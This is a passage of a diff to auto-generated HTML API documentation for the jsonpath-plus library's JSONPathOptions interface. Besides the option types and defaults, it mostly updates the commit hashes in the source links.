JSONPathOptions</h1></div><div class=\"tsd-signature\"><span class=\"tsd-signature-keyword\">interface </span><span class=\"tsd-kind-interface\">JSONPathOptions</span> <span class=\"tsd-signature-symbol\">{ </span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><a class=\"tsd-kind-property\" href=\"JSONPathOptions.html#autostart\">autostart</a><span class=\"tsd-signature-symbol\">?: </span><span class=\"tsd-signature-type\">boolean</span><span class=\"tsd-signature-symbol\">; </span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><a class=\"tsd-kind-property\" href=\"JSONPathOptions.html#callback\">callback</a><span class=\"tsd-signature-symbol\">?: </span><a href=\"../types/JSONPathCallback.html\" class=\"tsd-signature-type tsd-kind-type-alias\">JSONPathCallback</a><span class=\"tsd-signature-symbol\">; </span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><a class=\"tsd-kind-property\" href=\"JSONPathOptions.html#eval\">eval</a><span class=\"tsd-signature-symbol\">?: </span><br/><span>\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">boolean</span><br/><span>\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-keyword\">typeof </span><a href=\"../classes/EvalClass.html\" class=\"tsd-signature-type tsd-kind-class\">EvalClass</a><br/><span>\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">&quot;safe&quot;</span><br/><span>\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">&quot;native&quot;</span><br/><span>\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-symbol\">(</span><span class=\"tsd-signature-symbol\">(</span><span class=\"tsd-kind-parameter\">code</span><span class=\"tsd-signature-symbol\">: </span><span class=\"tsd-signature-type\">string</span>, <span class=\"tsd-kind-parameter\">context</span><span class=\"tsd-signature-symbol\">: </span><span class=\"tsd-signature-type\">object</span><span class=\"tsd-signature-symbol\">)</span><span class=\"tsd-signature-symbol\"> =&gt; </span><span class=\"tsd-signature-type\">any</span><span class=\"tsd-signature-symbol\">)</span><span class=\"tsd-signature-symbol\">; </span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><a class=\"tsd-kind-property\" href=\"JSONPathOptions.html#flatten\">flatten</a><span class=\"tsd-signature-symbol\">?: </span><span class=\"tsd-signature-type\">boolean</span><span class=\"tsd-signature-symbol\">; </span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><a class=\"tsd-kind-property\" href=\"JSONPathOptions.html#ignoreEvalErrors\">ignoreEvalErrors</a><span class=\"tsd-signature-symbol\">?: </span><span class=\"tsd-signature-type\">boolean</span><span class=\"tsd-signature-symbol\">; </span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><a class=\"tsd-kind-property\" href=\"JSONPathOptions.html#json\">json</a><span class=\"tsd-signature-symbol\">: </span><br/><span>\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">string</span><br/><span>\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">number</span><br/><span>\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">boolean</span><br/><span>\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">object</span><br/><span>\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">any</span><span class=\"tsd-signature-symbol\">[]</span><span class=\"tsd-signature-symbol\">; </span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><a class=\"tsd-kind-property\" href=\"JSONPathOptions.html#otherTypeCallback\">otherTypeCallback</a><span class=\"tsd-signature-symbol\">?: </span><a href=\"../types/JSONPathOtherTypeCallback.html\" class=\"tsd-signature-type tsd-kind-type-alias\">JSONPathOtherTypeCallback</a><span class=\"tsd-signature-symbol\">; </span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><a class=\"tsd-kind-property\" href=\"JSONPathOptions.html#parent\">parent</a><span class=\"tsd-signature-symbol\">?: </span><span class=\"tsd-signature-type\">any</span><span class=\"tsd-signature-symbol\">; </span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><a class=\"tsd-kind-property\" href=\"JSONPathOptions.html#parentProperty\">parentProperty</a><span class=\"tsd-signature-symbol\">?: </span><span class=\"tsd-signature-type\">any</span><span class=\"tsd-signature-symbol\">; </span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><a class=\"tsd-kind-property\" href=\"JSONPathOptions.html#path\">path</a><span class=\"tsd-signature-symbol\">: </span><span class=\"tsd-signature-type\">string</span><span class=\"tsd-signature-symbol\"> | </span><span class=\"tsd-signature-type\">any</span><span class=\"tsd-signature-symbol\">[]</span><span class=\"tsd-signature-symbol\">; </span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><a class=\"tsd-kind-property\" href=\"JSONPathOptions.html#resultType\">resultType</a><span class=\"tsd-signature-symbol\">?: </span><br/><span>\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">&quot;value&quot;</span><br/><span>\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">&quot;path&quot;</span><br/><span>\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">&quot;pointer&quot;</span><br/><span>\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">&quot;parent&quot;</span><br/><span>\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">&quot;parentProperty&quot;</span><br/><span>\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">&quot;all&quot;</span><span class=\"tsd-signature-symbol\">; </span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><a class=\"tsd-kind-property\" href=\"JSONPathOptions.html#sandbox\">sandbox</a><span class=\"tsd-signature-symbol\">?: </span><span class=\"tsd-signature-type\">Map</span><span class=\"tsd-signature-symbol\">&lt;</span><span class=\"tsd-signature-type\">string</span><span class=\"tsd-signature-symbol\">, </span><span class=\"tsd-signature-type\">any</span><span class=\"tsd-signature-symbol\">&gt;</span><span class=\"tsd-signature-symbol\">; </span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><a class=\"tsd-kind-property\" href=\"JSONPathOptions.html#wrap\">wrap</a><span class=\"tsd-signature-symbol\">?: </span><span class=\"tsd-signature-type\">boolean</span><span class=\"tsd-signature-symbol\">; </span><br/><span class=\"tsd-signature-symbol\">}</span></div><section class=\"tsd-panel tsd-hierarchy\"><h4>Hierarchy (<a href=\"../hierarchy.html#JSONPathOptions\">view full</a>)</h4><ul class=\"tsd-hierarchy\"><li><span class=\"target\">JSONPathOptions</span><ul class=\"tsd-hierarchy\"><li><a href=\"JSONPathOptionsAutoStart.html\" class=\"tsd-signature-type tsd-kind-interface\">JSONPathOptionsAutoStart</a></li></ul></li></ul></section><aside class=\"tsd-sources\"><ul><li>Defined in <a href=\"https://github.com/80avin/JSONPath/blob/39ee1844c610f9fd8925d3095ed3971e3d48025e/src/jsonpath.d.ts#L16\">jsonpath.d.ts:16</a></li></ul></aside><section class=\"tsd-panel-group tsd-index-group\"><section class=\"tsd-panel tsd-index-panel\"><details class=\"tsd-index-content tsd-accordion\" open><summary class=\"tsd-accordion-summary tsd-index-summary\"><h5 class=\"tsd-index-heading uppercase\" role=\"button\" aria-expanded=\"false\" tabIndex=\"0\"><svg width=\"16\" height=\"16\" viewBox=\"0 0 16 16\" fill=\"none\"><use href=\"../assets/icons.svg#icon-chevronSmall\"></use></svg> Index</h5></summary><div class=\"tsd-accordion-details\"><section class=\"tsd-index-section\"><h3 class=\"tsd-index-heading\">Properties</h3><div class=\"tsd-index-list\"><a href=\"JSONPathOptions.html#autostart\" class=\"tsd-index-link\"><svg class=\"tsd-kind-icon\" viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-1024\"></use></svg><span>autostart?</span></a>\n+<!DOCTYPE html><html class=\"default\" lang=\"en\"><head><meta charset=\"utf-8\"/><meta http-equiv=\"x-ua-compatible\" content=\"IE=edge\"/><title>JSONPathOptions | jsonpath-plus</title><meta name=\"description\" content=\"Documentation for jsonpath-plus\"/><meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"/><link rel=\"stylesheet\" href=\"../assets/style.css\"/><link rel=\"stylesheet\" href=\"../assets/highlight.css\"/><script defer src=\"../assets/main.js\"></script><script async src=\"../assets/icons.js\" id=\"tsd-icons-script\"></script><script async src=\"../assets/search.js\" id=\"tsd-search-script\"></script><script async src=\"../assets/navigation.js\" id=\"tsd-nav-script\"></script></head><body><script>document.documentElement.dataset.theme = localStorage.getItem(\"tsd-theme\") || \"os\";document.body.style.display=\"none\";setTimeout(() => app?app.showPage():document.body.style.removeProperty(\"display\"),500)</script><header class=\"tsd-page-toolbar\"><div class=\"tsd-toolbar-contents container\"><div class=\"table-cell\" id=\"tsd-search\" data-base=\"..\"><div class=\"field\"><label for=\"tsd-search-field\" class=\"tsd-widget tsd-toolbar-icon search no-caption\"><svg width=\"16\" height=\"16\" viewBox=\"0 0 16 16\" fill=\"none\"><use href=\"../assets/icons.svg#icon-search\"></use></svg></label><input type=\"text\" id=\"tsd-search-field\" aria-label=\"Search\"/></div><div class=\"field\"><div id=\"tsd-toolbar-links\"></div></div><ul class=\"results\"><li class=\"state loading\">Preparing search index...</li><li class=\"state failure\">The search index is not available</li></ul><a href=\"../index.html\" class=\"title\">jsonpath-plus</a></div><div class=\"table-cell\" id=\"tsd-widgets\"><a href=\"#\" class=\"tsd-widget tsd-toolbar-icon menu no-caption\" data-toggle=\"menu\" aria-label=\"Menu\"><svg width=\"16\" height=\"16\" viewBox=\"0 0 16 16\" fill=\"none\"><use href=\"../assets/icons.svg#icon-menu\"></use></svg></a></div></div></header><div class=\"container container-main\"><div class=\"col-content\"><div class=\"tsd-page-title\"><ul class=\"tsd-breadcrumb\"><li><a href=\"../modules.html\">jsonpath-plus</a></li><li><a href=\"JSONPathOptions.html\">JSONPathOptions</a></li></ul><h1>Interface JSONPathOptions</h1></div><div class=\"tsd-signature\"><span class=\"tsd-signature-keyword\">interface </span><span class=\"tsd-kind-interface\">JSONPathOptions</span> <span class=\"tsd-signature-symbol\">{ </span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><a class=\"tsd-kind-property\" href=\"JSONPathOptions.html#autostart\">autostart</a><span class=\"tsd-signature-symbol\">?: </span><span class=\"tsd-signature-type\">boolean</span><span class=\"tsd-signature-symbol\">; </span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><a class=\"tsd-kind-property\" href=\"JSONPathOptions.html#callback\">callback</a><span class=\"tsd-signature-symbol\">?: </span><a href=\"../types/JSONPathCallback.html\" class=\"tsd-signature-type tsd-kind-type-alias\">JSONPathCallback</a><span class=\"tsd-signature-symbol\">; </span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><a class=\"tsd-kind-property\" href=\"JSONPathOptions.html#eval\">eval</a><span class=\"tsd-signature-symbol\">?: </span><br/><span>\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">boolean</span><br/><span>\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-keyword\">typeof </span><a href=\"../classes/EvalClass.html\" class=\"tsd-signature-type tsd-kind-class\">EvalClass</a><br/><span>\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">&quot;safe&quot;</span><br/><span>\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">&quot;native&quot;</span><br/><span>\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-symbol\">(</span><span class=\"tsd-signature-symbol\">(</span><span class=\"tsd-kind-parameter\">code</span><span class=\"tsd-signature-symbol\">: </span><span class=\"tsd-signature-type\">string</span>, <span class=\"tsd-kind-parameter\">context</span><span class=\"tsd-signature-symbol\">: </span><span class=\"tsd-signature-type\">object</span><span class=\"tsd-signature-symbol\">)</span><span class=\"tsd-signature-symbol\"> =&gt; </span><span class=\"tsd-signature-type\">any</span><span class=\"tsd-signature-symbol\">)</span><span class=\"tsd-signature-symbol\">; </span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><a class=\"tsd-kind-property\" href=\"JSONPathOptions.html#flatten\">flatten</a><span class=\"tsd-signature-symbol\">?: </span><span class=\"tsd-signature-type\">boolean</span><span class=\"tsd-signature-symbol\">; </span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><a class=\"tsd-kind-property\" href=\"JSONPathOptions.html#ignoreEvalErrors\">ignoreEvalErrors</a><span class=\"tsd-signature-symbol\">?: </span><span class=\"tsd-signature-type\">boolean</span><span class=\"tsd-signature-symbol\">; </span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><a class=\"tsd-kind-property\" href=\"JSONPathOptions.html#json\">json</a><span class=\"tsd-signature-symbol\">: </span><br/><span>\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">string</span><br/><span>\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">number</span><br/><span>\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">boolean</span><br/><span>\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">object</span><br/><span>\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">any</span><span class=\"tsd-signature-symbol\">[]</span><span class=\"tsd-signature-symbol\">; </span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><a class=\"tsd-kind-property\" href=\"JSONPathOptions.html#otherTypeCallback\">otherTypeCallback</a><span class=\"tsd-signature-symbol\">?: </span><a href=\"../types/JSONPathOtherTypeCallback.html\" class=\"tsd-signature-type tsd-kind-type-alias\">JSONPathOtherTypeCallback</a><span class=\"tsd-signature-symbol\">; </span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><a class=\"tsd-kind-property\" href=\"JSONPathOptions.html#parent\">parent</a><span class=\"tsd-signature-symbol\">?: </span><span class=\"tsd-signature-type\">any</span><span class=\"tsd-signature-symbol\">; </span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><a class=\"tsd-kind-property\" href=\"JSONPathOptions.html#parentProperty\">parentProperty</a><span class=\"tsd-signature-symbol\">?: </span><span class=\"tsd-signature-type\">any</span><span class=\"tsd-signature-symbol\">; </span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><a class=\"tsd-kind-property\" href=\"JSONPathOptions.html#path\">path</a><span class=\"tsd-signature-symbol\">: </span><span class=\"tsd-signature-type\">string</span><span class=\"tsd-signature-symbol\"> | </span><span class=\"tsd-signature-type\">any</span><span class=\"tsd-signature-symbol\">[]</span><span class=\"tsd-signature-symbol\">; </span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><a class=\"tsd-kind-property\" href=\"JSONPathOptions.html#resultType\">resultType</a><span class=\"tsd-signature-symbol\">?: </span><br/><span>\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">&quot;value&quot;</span><br/><span>\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">&quot;path&quot;</span><br/><span>\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">&quot;pointer&quot;</span><br/><span>\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">&quot;parent&quot;</span><br/><span>\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">&quot;parentProperty&quot;</span><br/><span>\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">&quot;all&quot;</span><span class=\"tsd-signature-symbol\">; </span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><a class=\"tsd-kind-property\" href=\"JSONPathOptions.html#sandbox\">sandbox</a><span class=\"tsd-signature-symbol\">?: </span><span class=\"tsd-signature-type\">Map</span><span class=\"tsd-signature-symbol\">&lt;</span><span class=\"tsd-signature-type\">string</span><span class=\"tsd-signature-symbol\">, </span><span class=\"tsd-signature-type\">any</span><span class=\"tsd-signature-symbol\">&gt;</span><span class=\"tsd-signature-symbol\">; </span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><a class=\"tsd-kind-property\" href=\"JSONPathOptions.html#wrap\">wrap</a><span class=\"tsd-signature-symbol\">?: </span><span class=\"tsd-signature-type\">boolean</span><span class=\"tsd-signature-symbol\">; </span><br/><span class=\"tsd-signature-symbol\">}</span></div><section class=\"tsd-panel tsd-hierarchy\"><h4>Hierarchy (<a href=\"../hierarchy.html#JSONPathOptions\">view full</a>)</h4><ul class=\"tsd-hierarchy\"><li><span class=\"target\">JSONPathOptions</span><ul class=\"tsd-hierarchy\"><li><a href=\"JSONPathOptionsAutoStart.html\" class=\"tsd-signature-type tsd-kind-interface\">JSONPathOptionsAutoStart</a></li></ul></li></ul></section><aside class=\"tsd-sources\"><ul><li>Defined in <a href=\"https://github.com/80avin/JSONPath/blob/8e4acf8aff5f446aa66323e12394ac5615c3b260/src/jsonpath.d.ts#L16\">jsonpath.d.ts:16</a></li></ul></aside><section class=\"tsd-panel-group tsd-index-group\"><section class=\"tsd-panel tsd-index-panel\"><details class=\"tsd-index-content tsd-accordion\" open><summary class=\"tsd-accordion-summary tsd-index-summary\"><h5 class=\"tsd-index-heading uppercase\" role=\"button\" aria-expanded=\"false\" tabIndex=\"0\"><svg width=\"16\" height=\"16\" viewBox=\"0 0 16 16\" fill=\"none\"><use href=\"../assets/icons.svg#icon-chevronSmall\"></use></svg> Index</h5></summary><div class=\"tsd-accordion-details\"><section class=\"tsd-index-section\"><h3 class=\"tsd-index-heading\">Properties</h3><div class=\"tsd-index-list\"><a href=\"JSONPathOptions.html#autostart\" class=\"tsd-index-link\"><svg class=\"tsd-kind-icon\" viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-1024\"></use></svg><span>autostart?</span></a>\n <a href=\"JSONPathOptions.html#callback\" class=\"tsd-index-link\"><svg class=\"tsd-kind-icon\" viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-1024\"></use></svg><span>callback?</span></a>\n <a href=\"JSONPathOptions.html#eval\" class=\"tsd-index-link\"><svg class=\"tsd-kind-icon\" viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-1024\"></use></svg><span>eval?</span></a>\n <a href=\"JSONPathOptions.html#flatten\" class=\"tsd-index-link\"><svg class=\"tsd-kind-icon\" viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-1024\"></use></svg><span>flatten?</span></a>\n\n@@ -16,7 +16,7 @@\n</div><div class=\"tsd-comment tsd-typography\"><div class=\"tsd-tag-Default\"><h4 class=\"tsd-anchor-link\"><a id=\"Default\" class=\"tsd-anchor\"></a>Default<a href=\"#Default\" aria-label=\"Permalink\" class=\"tsd-anchor-icon\"><svg viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-anchor\"></use></svg></a></h4><pre><code class=\"ts\"><span class=\"hl-3\">true</span>\n </code><button type=\"button\">Copy</button></pre>\n \n-</div></div><aside class=\"tsd-sources\"><ul><li>Defined in <a href=\"https://github.com/80avin/JSONPath/blob/39ee1844c610f9fd8925d3095ed3971e3d48025e/src/jsonpath.d.ts#L33\">jsonpath.d.ts:33</a></li></ul></aside></section><section class=\"tsd-panel tsd-member\"><a id=\"callback\" class=\"tsd-anchor\"></a><h3 class=\"tsd-anchor-link\"><code class=\"tsd-tag\">Optional</code><span>callback</span><a href=\"#callback\" aria-label=\"Permalink\" class=\"tsd-anchor-icon\"><svg viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-anchor\"></use></svg></a></h3><div class=\"tsd-signature\"><span class=\"tsd-kind-property\">callback</span><span class=\"tsd-signature-symbol\">?:</span> <a href=\"../types/JSONPathCallback.html\" class=\"tsd-signature-type tsd-kind-type-alias\">JSONPathCallback</a></div><div class=\"tsd-comment tsd-typography\"><p>If supplied, a callback will be called immediately upon retrieval of\n+</div></div><aside class=\"tsd-sources\"><ul><li>Defined in <a href=\"https://github.com/80avin/JSONPath/blob/8e4acf8aff5f446aa66323e12394ac5615c3b260/src/jsonpath.d.ts#L33\">jsonpath.d.ts:33</a></li></ul></aside></section><section class=\"tsd-panel tsd-member\"><a id=\"callback\" class=\"tsd-anchor\"></a><h3 class=\"tsd-anchor-link\"><code class=\"tsd-tag\">Optional</code><span>callback</span><a href=\"#callback\" aria-label=\"Permalink\" class=\"tsd-anchor-icon\"><svg viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-anchor\"></use></svg></a></h3><div class=\"tsd-signature\"><span class=\"tsd-kind-property\">callback</span><span class=\"tsd-signature-symbol\">?:</span> <a href=\"../types/JSONPathCallback.html\" class=\"tsd-signature-type tsd-kind-type-alias\">JSONPathCallback</a></div><div class=\"tsd-comment tsd-typography\"><p>If supplied, a callback will be called immediately upon retrieval of\n an end point value.</p>\n <p>The three arguments supplied will be the value of the payload\n (according to <code>resultType</code>), the type of the payload (whether it is\n\n@@ -25,7 +25,7 @@\n</div><div class=\"tsd-comment tsd-typography\"><div class=\"tsd-tag-Default\"><h4 class=\"tsd-anchor-link\"><a id=\"Default-1\" class=\"tsd-anchor\"></a>Default<a href=\"#Default-1\" aria-label=\"Permalink\" class=\"tsd-anchor-icon\"><svg viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-anchor\"></use></svg></a></h4><pre><code class=\"ts\"><span class=\"hl-3\">undefined</span>\n </code><button type=\"button\">Copy</button></pre>\n \n-</div></div><aside class=\"tsd-sources\"><ul><li>Defined in <a href=\"https://github.com/80avin/JSONPath/blob/39ee1844c610f9fd8925d3095ed3971e3d48025e/src/jsonpath.d.ts#L140\">jsonpath.d.ts:140</a></li></ul></aside></section><section class=\"tsd-panel tsd-member\"><a id=\"eval\" class=\"tsd-anchor\"></a><h3 class=\"tsd-anchor-link\"><code class=\"tsd-tag\">Optional</code><span>eval</span><a href=\"#eval\" aria-label=\"Permalink\" class=\"tsd-anchor-icon\"><svg viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-anchor\"></use></svg></a></h3><div class=\"tsd-signature\"><span class=\"tsd-kind-property\">eval</span><span class=\"tsd-signature-symbol\">?:</span> <br/><span>\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">boolean</span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-keyword\">typeof </span><a href=\"../classes/EvalClass.html\" class=\"tsd-signature-type tsd-kind-class\">EvalClass</a><br/><span>\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">&quot;safe&quot;</span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">&quot;native&quot;</span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-symbol\">(</span><span class=\"tsd-signature-symbol\">(</span><span class=\"tsd-kind-parameter\">code</span><span class=\"tsd-signature-symbol\">: </span><span class=\"tsd-signature-type\">string</span>, <span class=\"tsd-kind-parameter\">context</span><span class=\"tsd-signature-symbol\">: </span><span class=\"tsd-signature-type\">object</span><span class=\"tsd-signature-symbol\">)</span><span class=\"tsd-signature-symbol\"> =&gt; </span><span class=\"tsd-signature-type\">any</span><span class=\"tsd-signature-symbol\">)</span></div><div class=\"tsd-comment tsd-typography\"><p>Script evaluation method.</p>\n+</div></div><aside class=\"tsd-sources\"><ul><li>Defined in <a href=\"https://github.com/80avin/JSONPath/blob/8e4acf8aff5f446aa66323e12394ac5615c3b260/src/jsonpath.d.ts#L140\">jsonpath.d.ts:140</a></li></ul></aside></section><section class=\"tsd-panel tsd-member\"><a id=\"eval\" class=\"tsd-anchor\"></a><h3 class=\"tsd-anchor-link\"><code class=\"tsd-tag\">Optional</code><span>eval</span><a href=\"#eval\" aria-label=\"Permalink\" class=\"tsd-anchor-icon\"><svg viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-anchor\"></use></svg></a></h3><div class=\"tsd-signature\"><span class=\"tsd-kind-property\">eval</span><span class=\"tsd-signature-symbol\">?:</span> <br/><span>\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">boolean</span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-keyword\">typeof </span><a href=\"../classes/EvalClass.html\" class=\"tsd-signature-type tsd-kind-class\">EvalClass</a><br/><span>\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">&quot;safe&quot;</span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">&quot;native&quot;</span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-symbol\">(</span><span class=\"tsd-signature-symbol\">(</span><span class=\"tsd-kind-parameter\">code</span><span class=\"tsd-signature-symbol\">: </span><span class=\"tsd-signature-type\">string</span>, <span class=\"tsd-kind-parameter\">context</span><span class=\"tsd-signature-symbol\">: </span><span class=\"tsd-signature-type\">object</span><span class=\"tsd-signature-symbol\">)</span><span class=\"tsd-signature-symbol\"> =&gt; </span><span class=\"tsd-signature-type\">any</span><span class=\"tsd-signature-symbol\">)</span></div><div class=\"tsd-comment tsd-typography\"><p>Script evaluation method.</p>\n <p><code>safe</code>: In browser, it will use a minimal scripting engine which doesn't\n use <code>eval</code> or <code>Function</code> and satisfies Content Security Policy. In NodeJS,\n it has no effect and is equivalent to native as scripting is safe there.</p>\n\n@@ -40,20 +40,20 @@\n</div><div class=\"tsd-comment tsd-typography\"><div class=\"tsd-tag-Default\"><h4 class=\"tsd-anchor-link\"><a id=\"Default-2\" class=\"tsd-anchor\"></a>Default<a href=\"#Default-2\" aria-label=\"Permalink\" class=\"tsd-anchor-icon\"><svg viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-anchor\"></use></svg></a></h4><pre><code class=\"ts\"><span class=\"hl-2\">&#39;safe&#39;</span>\n </code><button type=\"button\">Copy</button></pre>\n \n-</div></div><aside class=\"tsd-sources\"><ul><li>Defined in <a href=\"https://github.com/80avin/JSONPath/blob/39ee1844c610f9fd8925d3095ed3971e3d48025e/src/jsonpath.d.ts#L102\">jsonpath.d.ts:102</a></li></ul></aside></section><section class=\"tsd-panel tsd-member\"><a id=\"flatten\" class=\"tsd-anchor\"></a><h3 class=\"tsd-anchor-link\"><code class=\"tsd-tag\">Optional</code><span>flatten</span><a href=\"#flatten\" aria-label=\"Permalink\" class=\"tsd-anchor-icon\"><svg viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-anchor\"></use></svg></a></h3><div class=\"tsd-signature\"><span class=\"tsd-kind-property\">flatten</span><span class=\"tsd-signature-symbol\">?:</span> <span class=\"tsd-signature-type\">boolean</span></div><div class=\"tsd-comment tsd-typography\"><p>Whether the returned array of results will be flattened to a\n+</div></div><aside class=\"tsd-sources\"><ul><li>Defined in <a 